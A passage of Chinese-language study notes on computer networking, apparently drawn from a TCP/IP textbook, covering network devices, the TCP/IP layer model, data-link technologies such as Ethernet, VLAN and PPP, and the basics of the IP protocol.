Card，简称NIC）==。网络接口卡（NIC（集成了连接局域网功能的设备。有时会被集成到计算机的主板中，有时也可以单独插入扩展槽使用。Network Information Center的缩写也是NIC，所以要注意区分。） ）==有时也被叫做网络适配器、网卡、LAN卡==。\n中继器\n中继器（Repeater）是在OSI模型的第1层——物理层面上延长网络的设备。由电缆传过来的电信号或光信号经由中继器的波形调整和放大再传给另一个电缆。\n有些中继器可以提供多个端口服务。这种中继器被称作==中继集线器或集线器==。因此，集线器（中继集线器也可以简称为集线器或Hub） 也可以看作是多口中继器，每个端口都可以成为一个中继器。\n网桥/2层交换机\n网桥是在OSI模型的第2层——数据链路层面上连接两个网络的设备。它能够识别数据链路层中的==数据帧==（与分组数据意思大致相同，但是在数据链路层中通常习惯称为帧） ，并将这些数据帧临时存储于内存，再重新生成信号作为一个全新的帧转发给相连的另一个网段。\n这类功能是==OSI参考模型的第2层（数据链路层）所具有的功能==。为此，有时也把==网桥称作2层交换机==（L2交换机）。\n以太网等网络中经常使用的==交换集线器==（Hub（==具有网桥功能的Hub叫做交换集线器==。只有中继器功能的Hub叫做集线器。）），==现在基本也属于网桥的一种==。交换集线器中连接电缆的每个端口都能提供类似网桥的功能。\n路由器/3层交换机\n==路由器是在OSI模型的第3层——网络层面上连接两个网络、并对分组报文进行转发的设备==。网桥是根据物理地址（MAC地址）进行处理，而路由器/3层交换机则是根据IP地址进行处理的。由此，TCP/IP中网络层的地址就成为了IP地址。\n4～7层交换机\n4～7层交换机负责处理==OSI模型中从传输层至应用层的数据==。如果用TCP/IP分层模型来表述，==4～7层交换机就是以TCP等协议的传输层及其上面的应用层为基础，分析收发数据，并对其进行特定的处理。==\n==应用场景==：\n==负载均衡器==（对于并发访问量非常大的一个企业级Web站点使用一台服务器不足以满足前端的访问需求） ==带宽控制==（实际通信当中，在网络比较拥堵的时候，优先处理像语音这类对及时性要求较高的通信请求，放缓处理像邮件或数据转发等稍有延迟也并无大碍的通信请求） ==广域网加速器、特殊应用访问加速以及防火墙== 网关\n==网关是OSI参考模型中负责将从传输层到应用层的数据进行转换和转发的设备。==它与4～7层交换机一样都是处理传输层及以上的数据，但是网关不仅转发数据还负责对数据进行转换，它通常会使用一个表示层或应用层网关，在两个不能进行直接通信的协议之间进行翻译，最终实现两者之间的通信。\n一个非常典型的例子就是互联网邮件与手机邮件之间的转换服务。\n手机邮件有时可能会与互联网邮件互不兼容，这是由于它们在表示层和应用层中的“电子邮件协议”互不相同所导致的。那么，为什么连到互联网的电脑与手机之间能够互发电子邮件呢？如图1.47所示，互联网与手机之间设置了一道网关。网关负责读取完各种不同的协议后，==对它们逐一进行合理的转换，再将相应的数据转发出去。==这样一来即使应用的是不同电子邮件的协议，计算机与手机之间也能互相发送邮件。\n此外，在使用WWW（World Wide Web，万维网）时，为了控制网络流量以及出于安全的考虑，有时会使用代理服务器（Proxy Server）。这种代理服务器也是网关的一种，称为==应用网关==。有了代理服务器，客户端与服务器之间无需在网络层上直接通信，而是从传输层到应用层对数据和访问进行各种控制和处理。防火墙就是一款通过网关通信，针对不同应用提高安全性的产品。\n各种设备及其对应网络分层概览\n6.现代网络实态 每座大型城市的道路交通网中，或多或少都分布着高速公路。在计算机网络中有类似高速公路的部分，人们称为==“骨干”或“核心”==。正如其名，它们是计算机网络的中心。人们通常会选用高速路由器相互连接使之==快速传输大量数据==。\n网络中相应于高速公路==出入口==的部分被称作==“边缘网络”== 。常用的设备有多功能路由器（在路由器最基本的功能之上增加了按顺序/种类发送数据的功能，可以根据TCP/IP层的协议变换处理方法。） 和3层交换机。\n高速公路的出入口通常连接国道、省道，从而可以通往市区街道。==计算机网络中连接“边缘网络”的部分叫做“接入层”或“汇聚层”==。这样，==骨干网可以专注于如何提高业务传输性能和网络的生存性，而将具有业务智能化的高速路由器和交换机移到网络的边缘==。边缘网络的常用设备多为2层交换机或3层交换机。\n虚拟化和云\n抽奖、网游等网站，这些网站有一个共同的特点，那就是==具有明显的访问高峰点==。以提供抽奖的站点为例，在抽奖活动期间，白天或周末访问量都非常高，而在抽奖活动结束后基本无人问津。而且，在访问高峰期，网站又必须保证每一个用户都能正常访问，否则极可能会被起诉发生索赔事件。\n基于这样一个背景，出现了==虚拟化技术==。它是指当一个网站（也可以是其他系统）需要调整运营所使用的资源时，==并不增减服务器、存储设备、网络等实际的物理设备，而是利用软件将这些物理设备虚拟化==，在有必要增减资源的时候，通过软件按量增减的一种机制。通过此机制实现按需分配、按比例分配，对外提供可靠的服务。\n==利用虚拟化技术，根据使用者的情况动态调整必要资源的机制被人们称作“云”==。而且，将虚拟化的系统根据需要自动地进行动态管理的部分被称作==“智能协调层”==。它能够将服务器、存储、网络看作一个整体进行管理。有了“云”，网络的使用者就可以实现不论何时何地都可以只获取或只提供需要信息的机制。\n第2章 TCP/IP基础知识 TCP（Transmission Control Protocol）和IP（Internet Protocol）是互联网的众多通信协议中最为著名的。\n1.TCP/IP的标准化 20世纪90年代，ISO开展了OSI这一国际标准协议的标准化进程。 然而，OSI协议并没有得到普及，真正被广泛使用的是TCP/IP协议。\n究其原因，是由TCP/IP的标准化所致。==TCP/IP的标准化中有其他协议的标准化没有的要求==。这一点就是让TCP/IP更迅速地实现和普及的原动力。\nTCP/IP的具体含义 从字面意义上讲，有人可能会认为TCP/IP是指TCP与IP两种协议。实际生活当中有时也确实就是指这两种协议。然而在很多情况下，它只是==利用IP进行通信时所必须用到的协议群的统称==。具体来说，IP或ICMP、TCP或UDP、TELNET或FTP、以及HTTP等都属于TCP/IP的协议。它们与TCP或IP的关系紧密，是互联网必不可少的组成部分。==TCP/IP一词泛指这些协议==，因此，有时也称TCP/IP为网际协议族（网际协议族（Internet Protocol Suite）：组成网际协议的一组协议。）\nTCP/IP规范**——RFC** 前面提到TCP/IP的协议由IETF讨论制定。那些需要标准化的协议，被人们列入==RFC（Request For Comment）==（RFC从字面意义上看就是指征求意见表，属于一种征求协议相关意见的文档） 文档并在互联网上公布。RFC不仅记录了协议规范内容，还包含了协议的实现和运用的相关信息（==协议实现或运用相关的信息叫做FYI（For Your Information）==） ，以及实验方面的信息（==实验阶段的协议称作Experimental==） 。\nRFC文档通过编号组织每个协议的标准化请求。例如IP协议的规范由RFC279制定，TCP协议的规范由RFC793号文档决定。RFC的编码是既定的，一旦成为某一RFC的内容，就不能再对其进行随意修改。若要扩展已有某个协议规范的内容，一定要有一个全新编号的RFC文档对其进行记录。若要修改已有某个协议规范内容，则需要重新发行一个新的 RFC文档，同时，老的那份RFC作废。新的RFC文档会明确规定是扩展了哪个已有的RFC以及要作废哪个已有RFC。\n此时，有人提出每当对RFC进行修改时都要产生新的RFC编号太麻烦。为此，人们采用==STD（Standard）==（例如STD5表示包含ICMP的IP协议标准。因此，STD5由RFC791、RFC919、RFC922、RFC792、RFC950以及RFC1112 6个RFC组成） 方式管理编号。STD用来记载哪个编号制定哪个协议。因此，==同一个协议的规范内容即便发生了变化也不会导致STD编号发生变化==。\n今后，即使协议规范的内容改变也不会改变STD编号，但是有可能导致某个STD下的RFC编号视情况有所增减。\n此外，为了向互联网用户和管理者提供更有益的信息，与STD类似，FYI（For Your Information）也开始标注编号组织。FYI为了人们方便检索，也在其每个编号里涵盖了所涉及的RFC编号。即使更新内容，编号也不会发生变化。\nSTD1记录着所有要求协议标准化的RFC状态。到2012年1月为止，STD1相当于RFC5000（很多情况下会采用比较容易记忆的编号）。\n每个RFC的最新信息请参考http://www.rfc-editor.org/rfc/rfc××××.txt（其中××××为RFC编号）。\nSTD获取网址：http://www.rfc-editor.org/in-notes/std/\nFYI获取网址：http://www.rfc-editor.org/in-notes/fyi/ ID（I-D：Internet Draft）获取网址：http://www.rfc-editor.org/internet-drafts/\n2.互联网基础知识 互联网定义 “互联网”，英文单词为“Internet”。从字面上理解，internet指的是将多个网络连接使其构成一个更大的网络，所以internet一词本意为==网际网==。将两个以太网网段用路由器相连是互联网，将企业内部各部门的网络或公司的内网与其他企业相连接，并实现相互通信的网络也是互联网，甚至一个区域的网络与另一个区域的网络相互连接形成全世界规模 的网络也可以称作互联网。然而，现在“互联网”这个词的意思却有所变化。==当专门指代网络之间的连接时，可以使用“网际网”这个词==。\n==“互联网”是指由ARPANET（Advanced Research Projects Agency Network，阿帕网 ，也是全球互联网的鼻祖==发展而来、互连全世界的计算机网络。==现在，“互联网”已经是一个专有名词了，其对应的英文单词==“The Internet”==也早已成为固有名词（Internet指网际网，The Internet指互联网，首字母大写）（与Internet对应的另一种网络叫做Intranet。该网络是指使用Internet技术将企业内部的组织机构连接起来形成一个企业范围内的封闭网络，提供面向企业内部的通信服务） 。\n互联网与TCP/IP的关系 互联网进行通信时，需要相应的网络协议，TCP/IP原本就是为使用互联网而开发制定的协议族。因此，==互联网的协议就是TCP/IP，TCP/IP就是互联网的协议==。\n互联网的结构 互联网中的每个网络都是由==骨干网==（BackBone）和末端网（Stub）组成的。每个网络之间通过==NOC（Network Operation Center，网络操作中心）== 相连。如果网络的运营商不同，它的网络连接方式和使用方法也会不同。连接这种异构网络需要有==IX（Internet Exchange，网络交换中心）== 的支持。总之，互联网就是众多异构的网络通过IX互连的一个巨型网络。\n3.TCP/IP协议分层模型 TCP/IP与OSI参考模型 图2.8列出了TCP/IP与OSI分层之间的大致关系。不难看出，TCP/IP与OSI在分层模块上稍有区别。==OSI参考模型注重“通信协议必要的功能是什么”，而TCP/IP则更强调“在计算机上实现协议应该开发哪种程序”==。\n硬件（物理层） TCP/IP的最底层是负责数据传输的硬件。这种硬件就相当于以太网或电话线路等物理层的设备。\n网络接口层（数据链路层） 网络接口层（有时人们也将网络接口层与硬件层合并起来称作网络通信层。） 利用以太网中的数据链路层进行通信，因此属于接口层。 也就是说，把它当做让NIC起作用的“驱动程序”也无妨。驱动程序是在操作系统与硬件之间起桥梁作用的软件。\n互联网层（网络层） 互联网层使用IP协议，它相当于OSI模型中的第3层网络层。IP协议基于IP地址转发分包数据。\n==TCP/IP分层中的互联网层与传输层的功能通常由操作系统提供。尤其是路由器，它必须得实现通过互联网层转发分组数据包的功能==。\n此外，连接互联网的所有主机跟路由器必须都实现IP的功能。其他连接互联网的网络设备（如网桥、中继器或集线器）就没必要一定实现IP或TCP的功能（有时为了监控和管理网桥、中继器、集线器等设备，也需要让它们具备IP、TCP的功能。） 。\nIP\nIP是跨越网络传送数据包，使整个互联网都能收到数据的协议。IP协议使数据能够发送到地球的另一端，这期间它使用IP地址作为主机的标识。\nIP还隐含着数据链路层的功能。通过IP，相互通信的主机之间不论经过怎样的底层数据链路都能够实现通信。\n虽然IP也是分组交换的一种协议，但是它==不具有重发机制。即使分组数据包未能到达对端主机也不会重发。因此，属于非可靠性传输协议。==\nICMP（Internet Control Message Protocol）\nIP数据包在发送途中一旦发生异常导致无法到达对端目标地址时，需要给发送端发送一个发生异常的通知。ICMP就是为这一功能而制定的。它有时也被用来==诊断网络的健康状况==。\nARP\n从分组数据包的==IP地址中解析出物理地址（MAC地址）==的一种协议。\n传输层 TCP/IP的传输层有两个具有代表性的协议。该层的功能本身与OSI参考模型中的传输层类似。\n传输层最主要的功能就是能够让应用程序之间实现通信。计算机内部，通常同一时间运行着多个程序。为此，必须分清是哪些程序与哪些程序在进行通信。识别这些应用程序的是端口号。\nTCP\nTCP是一种面向有连接的传输层协议。它可以==保证两端通信主机之间的通信可达。TCP能够正确处理在传输过程中丢包、传输顺序乱掉等异常情况==。此外，TCP还能够有效利用带宽，缓解网络拥堵。\n然而，为了建立与断开连接，有时它需要至少7次的发包收包，导致网络流量的浪费。此外，为了提高网络的利用率，TCP协议中定义了各种各样复杂的规范，因此==不利于视频会议（音频、视频的数据量既定）等场合使用==。\nUDP\nUDP有别于TCP，它是一种面向==无连接的==传输层协议。==UDP不会关注对端是否真的收到了传送过去的数据==，如果需要检查对端是否收到分组数据包，或者对端是否连接到网络，则需要在应用程序中实现。\nUDP常用于==分组数据较少或多播、广播通信以及视频通信等多媒体领域==。\n应用层（会话层以上的分层） TCP/IP的分层中，将OSI参考模型中的==会话层、表示层和应用层的功能都集中到了应用程序中实现==。这些功能有时由一个单一的程序实现，有时也可能会由多个程序实现。因此，细看TCP/IP的应用程序功能会发现，它不仅实现OSI模型中应用层的内容，还要实现会话层与表示层的功能。\nWWW\nWWW（中文叫万维网，是一种互联网上数据读取的规范。有时也叫做Web、WWW或W3。） 可以说是互联网能够如此普及的一个重要原动力。\n浏览器与服务端之间通信所用的协议是HTTP（HyperText Transfer Protocol）。所传输数据的主要格式是HTML（HyperText Markup Language）。==WWW中的HTTP属于OSI应用层的协议，而HTML属于表示层的协议==。\n电子邮件（E-Mail）\n发送电子邮件时用到的协议叫做==SMTP（Simple Mail Tranfer Protocol）==。\n电子邮件的格式由==MIME==（在互联网上广泛使用的、用来定义邮件数据格式一种规范） ==协议==扩展以后，就可以发送声音、图像等各式各样的信息。甚至还可以修改邮件文字的大小、颜色（有时某些机能可能会因为邮件接收端软件的限制不能充分展现） 。这里提到的==MIME属于OSI参考模型的第6层——表示层==。\n文件传输（FTP）\n文件传输是指将保存在其他计算机硬盘上的文件转移到本地的硬盘上，或将本地硬盘的文件传送到其他机器硬盘上的意思。\n该过程使用的协议叫做==FTP（File Transfer Prototol）==。FTP很早就已经投入使用（最近在文件传输中使用WWW的HTTP的情况也在增加。） ， 传输过程中可以选择用二进制方式还是文本方式（用文本方式在Windows、MacOS或Unix等系统之间进行文件传输时，会自动修改换行符。这也属于表示层的功能） 。\n在FTP中进行文件传输时会建立两个TCP连接，分别是发出==传输请求时所要用到的控制连接与实际传输数据时所要用到的数据连接====（这两种连接的控制管理属于会话层的功能）== 。\n远程登录（TELNET与SSH）\n远程登录是指登录到远程的计算机上，使那台计算机上的程序得以运行的一种功能。TCP/IP网络中远程登录常用 TELNET（TELetypewriter NETwork的缩写。有时也称作默认协议） 和SSH（SSH是Secure SHell的缩写） 两种协议。其实还有很多其他可以实现远程登录的协议，如BSD UNIX系中rlogin的r命令协议以及X Window System中的X协议。\n网络管理（SNMP）\n在TCP/IP中进行网络管理时，采用==SNMP（Simple Network Management Protocol）协议==。使用SNMP管理的主机、网桥、路由器等称作==SNMP代理（Agent）==，而进行管理的那一段叫做==管理器（Manager）==。SNMP正是这个Manager与Agent所要用到的协议。\n在SNMP的代理端，保存着网络接口的信息、通信数据量、异常数据量以及设备温度等信息。这些信息可以通过MIB（Management Information Base）（MIB也被称为是一种可透过网络的结构变量） 访问。因此，在TCP/IP的网络管理中，==SNMP属于应用协议，MIB属于表示层协议==。\n一个网络范围越大，结构越复杂，就越需要对其进行有效的管理。而SNMP可以让管理员及时检查网络拥堵情况，及早发现故障，也可以为以后扩大网络收集必要的信息。\n4.TCP/IP分层模型与通信示例 TCP/IP是如何在媒介上进行传输的呢？本节将介绍使用TCP/IP时， 从应用层到物理媒介为止数据处理的流程。\n数据包首部 在下一 层的角度看，从上一分层收到的包全部都被认为是本层的数据。\n包、帧、数据包、段、消息\n以上五个述语都用来表述数据的单位，大致区分如下：\n包可以说是全能性述语。帧用于表示数据链路层中包的单位。而数据包是IP和UDP等网络层以上的分层中包的单位。段则表示TCP数据流中的信息。最后，消息是指应用协议中数据的单位。\n发送数据包 假设甲给乙发送电子邮件，内容为：“早上好”。而从TCP/IP通信上看，是从一台计算机A向另一台计算机B发送电子邮件。我们就通过这个例子来讲解一下TCP/IP通信的过程。\n① 应用程序处理\n② TCP模块的处理\n③ IP模块的处理\n④ 网络接口（以太网驱动）的处理\n经过数据链路的包 分组数据包（以下简称包）经过以太网的数据链路时的大致流程如图2.19所示。不过请注意，该图对各个包首部做了简化。\n每个包首部中至少都会包含两个信息：==一个是发送端和接收端地址，另一个是上一层的协议类型==。\n数据包接收处理 包的接收流程是发送流程的逆序过程。\n⑤ 网络接口（以太网驱动）的处理\n⑥ IP模块的处理\n⑦ TCP模块的处理\n⑧ 应用程序的处理\n第3章 数据链路 1.数据链路的作用 数据链路，指OSI参考模型中的数据链路层，有时也指以太网、无线局域网等通信手段。\nOSI参考模型中数据链路层的相关技术，包括MAC寻址（物理寻址）、介质共享、非公有网络、分组交换、环路检测、VLAN（Virtual Local Area Network，虚拟局域网）等。\n作为传输方式的数据链路：如以太网、WLAN（Wireless Local Area Network，无限局域网）、PPP（Point to Point Protocol，点对点协议）。\n数据链路也可以被视为网络传输中的最小单位。\n2.数据链路相关技术 MAC地址 MAC地址用于识别数据链路中互连的节点（如图3.4）。\nMAC地址长48比特，结构如图3.5所示。在使用网卡（NIC）的情况下，MAC地址一般会被烧入到ROM中。因此，任何一个网卡的MAC地址都是唯一的，在全世界都不会有重复（也有例外）\n共享介质型网络 从通信介质（通信，介质）的使用方法上看，网络可分为==共享介质型==和==非共享介质型==。\n==共享介质型网络指由多个设备共享一个通信介质的一种网络==。最早的以太网和FDDI就是介质共享型网络。在这种方式下，设备之间使用同一个载波信道进行发送和接收。为此，基本上==采用半双工通信方式==，并有必要对介质进行访问控制。\n共享介质型网络中有两种介质访问控制方式：一种是==争用方式==，另 一种是==令牌传递==方式。\n争用方式（Contention）是指==争夺获取数据传输的权力==，也叫 CSMA（载波监听多路访问）。这种方法通常令网络中的各个站（数据链路中很多情况下称节点为“站”。） 采用先到先得的方式占用信道 发送数据，如果多个站同时发送帧，则会产生冲突现象。也因此会导致网络拥堵与性能下降。\n在一部分以太网当中，采用了改良CSMA的另一种方式—— ==CSMA/CD==（Carrier Sense Multiple Access with Collision Detection） 方式。CSMA/CD要求每个站提前检查冲突，==一旦发生冲突，则尽早释放信道==。\n令牌传递方式是沿着令牌环发送一种叫做“令牌”的特殊报文，是控制传输的一种方式。==只有获得令牌的站才能发送数据==。这种方式有两个特点：一是不会有冲突，二是每个站都有通过平等循环获得令牌的机会。因此，即使网络拥堵也不会导致性能下降。\n非共享介质网络 非共享介质网络是指==不共享介质==，是对介质采取专用的一种传输控制方式。在这种方式下，网络中的每个站直连交换机，由交换机负责转发数据帧。此方式下，发送端与接收端并不共享通信介质，因此很多情况下采用==全双工通信方式==。\n半双工与全双工通信\n==半双工是指，只发送或只接收的通信方式==。它类似于无线电收发 器，若两端同时说话，是听不见对方说的话的。而==全双工==不同，它==允许在同一时间既可以发送数据也可以接收数据==。类似于电话，接打双方可以同时说话。\n采用CSMA/CD方式的以太网，如图3.7所示，首先要判断是否可以通信，如果可以就独占通信介质发送数据。因此，它像无线电收发器一样，不能同时接收和发送数据。\n同样是以太网，在使用交换机与双绞线电缆（亦或光纤电缆）的情况下，既可以通过交换机的端口与计算机之间进行一对一的连接，也可以通过相连电缆内部的收发线路分别进行接收和发送数据。因此，交换机的端口与计算机之间可以实现同时收发的全双工通信。\n根据MAC地址转发 以太网交换机就是持有多个端口（计算机设备的外部接口都称做端口。）的网桥。它们根据数据链路层中每个帧的目标MAC地址，决定从哪个网络接口发送数据。这时所参考的、用以记录发送接口的表就叫做转发表（Forwarding Table）。\n这种转发表的内容不需要使用者在每个终端或交换机上手工设置，而是可以自动生成。数据链路层的每个通过点在接到包时，会从中将源MAC地址以及曾经接收该地址发送的数据包的接口作为对应关系记录到转发表中。以某个MAC地址作为源地址的包由某一接口接收，实质上可以理解为该MAC地址就是该接口的目标。因此也可以说，以该MAC地址作为目标地址的包，经由该接口送出即可。这一过程也叫==自学过程==。\nVLAN 进行网络管理的时候，时常会遇到分散网络负载、变换部署网络设备的位置等情况。而有时管理员在做这些操作时，不得不修改网络的拓扑结构，这也就意味着必须进行硬件线路的改造。然而，如果采用带有VLAN技术的网桥（交换机），就不用实际修改网络布线，只需修改网络的结构即可。VLAN技术附加到网桥/2层交换机上，就可以切断所有VLAN之间的所有通信。因此，相比一般的网桥/2层交换机，VLAN可以过滤多余的包，提高网络的承载效率。\n那么VLAN究竟是什么？如图3.15所示，==该交换机按照其端口区分了多个网段，从而区分了广播数据传播的范围、减少了网络负载并提高了网络的安全性。==然而异构的两个网段之间，就需要利用具有路由功能的交换机（如3层交换机），或在各段中间通过路由器的连接才能实现通信。\n3.以太网 它的规范简单，易于NIC（网卡）及驱动程序实现。\n以太网连接形式 在以太网普及之初，一般采用多台终端使用同一根同轴电缆的==共享介质型连接方式==。\n而现在，随着互连设备的处理能力以及传输速度的提高，一般都采用==终端与交换机之间独占电缆==的方式实现以太网通信，如图3.18。\n以太网帧格式 以太网帧前端有一个叫做前导码（Preamble）的部分，它由0、1数字交替组合而成，表示一个以太网帧的开始，也是对端网卡能够确保与其同步的标志。如图3.19所示。前导码末尾是一个叫做SFD（Start Frame Delimiter）的域，它的值是“11”。在这个域之后就是以太网帧的本体（图3.20）。前导码与SFD合起来占8个字节。\n以太网帧本体的前端是以太网的首部，它总共占14个字节。分别是6个字节的目标MAC地址、6个字节的源MAC地址以及2个字节的上层协议类型。\n数据链路层分为两层\n可以将数据链路层分为==介质访问控制层（简称MAC（Media Access Control））== 和==逻辑链路控制层（简称LLC（Logical Link Control））== 。 介质访问控制层根据以太网或FDDI等不同数据链路所==特有的首部信息==进行控制。与之相比，逻辑链路层则根据以太网或FDDI等不同数据链路所==共有的帧头信息==进行控制。\n4.无线通信 无线通信通常使用电磁波、红外线、激光等方式进行传播数据。一般在办公室的局域网范围内组成的较高速的连接称为无线局域网。\n无线通信，依据通信距离可分为如表3.3所列出的类型。IEEE802委员会制定了无线PAN（Personal Area Network） （802.15）、无线 LAN（Local Area Network）（802.11）、无线MAN（Metropolitan Area Network） （802.16）以及无线RAN（Regional Area Network）（802.22）等无线标准。无线WAN（Wide Area Network） 的最典型代表就是手机通信。手机通过基站能够实现长距离通信。\nWi-Fi\n与音响中Hi-Fi（High Fidelity：高保真、高重现）这个词类似， ==Wi-Fi（Wireless Fidelity）==指高质量的无线LAN。\n5.PPP PPP（Point-to-Point Protocol）是指点对点，即1对1连接计算机的协议。PPP相当于位于OSI参考模型第2层的数据链路层。\nPPP不像以太网和FDDI。后两者不仅与OSI参考模型的数据链路层有关，还与第1层的物理层有关。具体来讲，以太网使用同轴电缆或双 绞线电缆，它可以决定其中的0、1该被解释为何种电子信号。与之相比，==PPP属于纯粹的数据链路层，与物理层没有任何关系。==换句话说，仅有PPP无法实现通信，还需要有物理层的支持。\nPPP可以使用电话线或ISDN、专线、ATM线路。此外，近些年人们更多是在用ADSL或有线电视==通过PPPoE（PPP over Ethernet）实现互联网接入==。PPPoE是在以太网的数据中加入PPP帧进行传输的一种方式。\n有些互联网接入服务商在以太网上利用==PPPoE（PPP over Ethernet）== 提供PPP功能。\n单纯的以太网没有验证功能，也没有建立和断开连接的处理，因此无法按时计费。而如果采用PPPoE管理以太网连接，就可以利用PPP的验证等功能使各家ISP可以有效地管理终端用户的使用。\n6.其他数据链路 ATM\nATM（Asynchronous Transfer Mode）是以一个叫做信元（5字节首部加48字节数据）的单位进行传输的数据链路，由于其线路占用时间短和能够高效传输大容量数据等特点主要用于广域网络的连接。\nPOS\nPOS（Packet over SDH/SONET）是一种在SDH（Synchronous Digital Hierarchy，同步数字体系） （SONET（Synchronous Optical NETwork，同步光纤网络） ）上进行包通信的一种协议。 SDH（SONET）是在光纤上传输数字信号的物理层规范。\nFDDI\nFDDI（Fiber Distributed Data Interface）叫做光纤分布式数据接口。 曾几何时，人们为了用光纤和双绞线实现100Mbps的传输速率，在主干网或计算机之间的高速连接上广泛使用了FDDI。但是由于后来高速LAN提供了Gbps级的传输速率，FDDI也就逐渐淡出了应用领域。\nToken Ring\n令牌环网（Token Ring）源自IBM开发的令牌环LAN技术，可以实现4Mbps或16Mbps传输速率。前面提到的FDDI实际上是扩展了Token Ring的一个产物。\n100VG-AnyLAN\n100VG-AnyLAN是IEEE802.12规范定义的一种网络协议。它以语音级的3类UTP电缆实现100Mbps的传输速率。它的数据帧格式既能应对以太网又能应对令牌环网。鉴于100Mbps以太网（100BASE-TX）的普及，100VG-AnyLAN也几乎不再被使用。\n光纤通道\n光纤通道（Fiber Channel）是实现高速数据通信的一种数据链路。 与其说它是一种网络，不如说它更像是SCSI那样类似于连接计算机周边设备的总线一样的规范。数据传输速率为133Mbpx～4Gbps。近些年被广泛用于搭建SAN（Storage Area Network，存储域网络。服务器与多台存储设备（硬盘、磁带备份）之间高速传输数据的网络系统。一般在企业当中用于保存超大容量数据） ，成为其主要数据链路。\nHIPPI\nHIPPI用于连接超大型计算机传输速率为800Mbps或1.6Gbps。铜缆的实际传输距离在25米以内，但是如果使用光纤作为传输介质时，可以延长到数公里。\nIEEE1394\n也叫FireWire或i.Link，是面向家庭的局域网，主要用于连接AV等计算机外围设备。数据传输速率为100～800Mbps以上。\nHDMI\nHDMI是High-Definition Multimedia Interface的缩写，意为高清晰度多媒体接口。它可以通过一根缆线实现图像和声音等数字信号的高品质传输。曾主要用于DVD/蓝光播放器、录像机、AV功放等设备与电视机、投影仪的连接，现在也逐渐开始用于计算机或平板电脑、数码相机与显示器的连接。\niSCSI\n它是将个人电脑连接硬盘的SCSI标准应用于TCP/IP网络上的一种标准（RFC3720、RFC3783） 。它把SCSI的命令和数据包含进IP包内，进行数据传输。由此，人们就可以像使用个人电脑内嵌的SCSI硬盘一样使用网络上直连的大规模硬盘了。\nInfiniBand\nInfiniBand是针对高端服务器的一种超高速传输接口技术。它最大的特点是高速、高可靠性以及低延迟。它支持多并发链接，将多个线缆（如4链接或12链接。）合并为一个线缆。可以实现从2Gbps至数百Gbps的传输速率。以后甚至还计划提供数千Gbps的高速传输速率。\nDOCSIS\nDOCSIS是有线电视（CATV）传输数据的行业标准，由MCNS（Multidedia Cable Network System Patners Limited） 制定。该标准定义了有线电视的同轴电缆与Cable Modem（电缆调制解调器）的连接及其与以太网进行转换的具体规范。此外，有一个叫做CableLabs（有线电视业界的研究开发机构）的组织对Cable Modem进行认证。\n高速PLC\n高速PLC（Power line Communication，高速电力线通信。） 是指在家里或办公室内利用电力线上数MHz～数十MHz频带范围，实现数十Mbps～200Mbps传输速率的一种通信方式。使用电力线不用重新布线，也能进行日常生活以及家电设备或办公设备的控制。然而，本不是为通信目的而设计的电力线在传输高频信号时，极容易收到电波干扰，一般仅限于室内（家里、办公室内）使用。\n7.公共网络 所谓的公共通信服务类似于电信运营商（如NTT、KDDI或软银等）提供的电话网络。人们通过与这些运营商签约、付费不仅可以实现联网还可以与距离遥远的机构组织进行通信。\n主要包括==模拟电话线路、移动通信、ADSL、FTTH、有线电视、专线、VPN以及公共无线LAN==等。\n第4章 IP协议 IP（Internet Protocol，网际协议）作为整个TCP/IP中至关重要的协议，主要负责==将数据包发送给最终的目标计算机==。因此，IP能够让世界上任何两台计算机之间进行通信。\n1.IP即网际协议 TCP/IP的心脏是互联网层。这一层主要由==IP（Internet Protocol）==和 ==ICMP（Internet Control Message Protocol）==两个协议组成。\n==IP（IPv4、IPv6）相当于OSI参考模型中的第3层——网络层==。 网络层的主要作用是“实现终端节点之间的通信”。这种终端节点之间的通信也叫“点对点（end-to-end）通信”。 从前面的章节可知，网络层的下一层——数据链路层的主要作用是在互连同一种数据链路的节点之间进行包传递。而一旦跨越多种数据链路，就需要借助网络层。==网络层可以跨越不同的数据链路==，即使是在不同的数据链路上也能实现两端节点之间的数据包传输。\n网络层与数据链路层的关系 数据链路层提供==直连两个设备之间==的通信功能。与之相比，作为网络层的IP则负责在==没有直连的两个网络之间==进行通信传输。那么为什么一定需要这样的两个层次呢？它们之间的区别又是什么呢？\n计算机网络中也需要数据链路层和网络层这个分层才能实现向最终目标地址的通信。\n2.IP基础知识 IP大致分为三大作用模块，它们是==IP寻址、路由（最终节点为止的转发）以及IP分包与组包==。\n主机与节点\n在互联网世界中，将那些配有IP地址的设备叫做“主机”。可以是超大型计算机，也可以是小型计算机。这是因为互联网在当初刚发明的时候，只能连接这类大型的设备，因此习惯上就将配有IP地址的设备称为“主机”。然而，准确地说，==主机的定义应该是指“配置有IP地址，但是不进行路由控制==（路由控制英文叫做Routing，是指中转分组数据包） 的设备”。==既配有IP地址又具有路由控制能力的设备叫做“路由器”==，跟主机有所区别。而==节点则是主机和路由器的统称==（这些都是IPv6的规范RFC2460中所使用的名词术语。在IPv4的规范RFC791中，将具有路由控制功能的设备叫做“网关”，然而现在都普遍叫做路由器（或3层交换机）） 。\n==路由控制（Routing）==是指将分组数据发送到最终目标地址的功能。即使网络非常复杂，也可以通过路由控制确定到达目标地址的通路。\n路由控制表\n为了将数据包发给目标主机，所有主机都维护着一张路由控制表（Routing Table）。该表记录IP数据在下一步应该发给哪个路由器。IP包将根据这个路由表在各个数据链路上传输。\n数据链路的抽象化\nIP是实现多个数据链路之间通信的协议。数据链路根据种类的不同各有特点。对这些不同数据链路的相异特性进行抽象化也是IP的重要作用之一。\n==IP分片处理（IP Fragmentation）==。顾名思义，所谓分片处理是指，将较大的IP包分成多个较小的IP包 。分片的包到了对端目标地址以后会再被组合起来传给上一层。即从IP的上次层看，它完全可以忽略数据包在途中的各个数据链路上的MTU，而只需要按照源地址发送的长度接收数据包。IP就是以这种方式抽象化了数据链路层，使得从上层更不容易看到底层网络构造的细节。\nIP属于面向无连接型\n==IP面向无连接。即在发包之前，不需要建立与对端目标地址之间的连接。==上层如果遇到需要发送给IP的数据，该数据会立即被压缩成IP包发送出去。\n为什么IP要采用面向无连接呢？\n主要有两点原因：一是为了简化，二是为了提速。面向连接比起面向无连接处理相对复杂。甚至管理每个连接本身就是一个相当繁琐的事情。此外，每次通信之前都要事先建立连接，又会降低处理速度。需要有连接时，可以委托上一层提供此项服务。因此，IP为了实现简单化与高速化采用面向无连接的方式。\n为了提高可靠性，==上一层的TCP采用面向有连接型==。\n3.IP地址的基础知识 IP地址的定义\nIP地址（IPv4地址）由==32位正整数==来表示。TCP/IP通信要求将这样的IP地址分配给每一个参与通信的主机。IP地址在计算机内部以二进制（二进制是指用0、1表示数字的方法。） 